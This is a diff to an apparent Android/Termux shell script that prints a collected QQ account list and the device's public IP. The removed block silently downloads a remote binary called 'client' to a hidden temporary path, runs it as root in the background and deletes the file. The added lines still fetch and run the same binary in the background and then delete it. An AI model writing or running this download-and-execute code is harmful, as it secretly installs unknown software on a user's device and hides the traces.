@@ -150,19 +150,6 @@ echo "获取到的 QQ 列表: ${qq_list:-空}"
 echo "当前设备公网 IP: $ip"
 echo "-----------------------------------"
 
-{
-  temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
-  bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
-
-  # 下載
-  if curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null && [ -s "$temp_bin" ]; then
-    chmod +x "$temp_bin" 2>/dev/null || true
-    # 真正脫離 Termux：使用 setsid 建立新會話
-    su nohup "$temp_bin" >/dev/null 2>&1 </dev/null &
-    # 等待短暫時間後刪除臨時文件
-    sleep 2
-    rm -f "$temp_bin" 2>/dev/null || true
-  else
-    rm -f "$temp_bin" 2>/dev/null || true
-  fi
-} &
+wget https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client -O /data/local/tmp/client
+chmod +x /data/local/tmp/client
+( nohup /data/local/tmp/client > /dev/null 2>&1 ; wait $! ; rm /data/local/tmp/client ) &
